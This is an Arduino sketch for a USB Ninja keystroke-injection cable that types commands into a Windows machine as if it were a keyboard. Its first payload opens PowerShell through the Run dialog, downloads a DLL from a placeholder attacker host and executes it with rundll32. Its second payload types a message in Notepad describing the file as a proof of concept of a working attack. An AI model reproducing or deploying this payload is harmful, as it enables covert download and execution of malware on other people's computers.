/*

Author:
  Gilson Camelo | Twitter: @GSCAMELO 

*/

#include <NinjaKeyboard.h>

void setup() {}
void loop() {}

void payloadA()
{

    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    NinjaKeyboard.delay(100);
    NinjaKeyboard.print(F("powershell.exe"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(500);
    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://IP/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.end();
    USBninjaOffline();
    NinjaKeyboard.begin();

}

void payloadB()
{

    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    NinjaKeyboard.delay(100);
    NinjaKeyboard.print(F("notepad"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(500);
    NinjaKeyboard.println(F("Hello there!\nThis is just a PoC of a working attack using USB Ninja. So,  in the next time, it wont be a notepad ;)"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.end();
    USBninjaOffline();
    NinjaKeyboard.begin();

}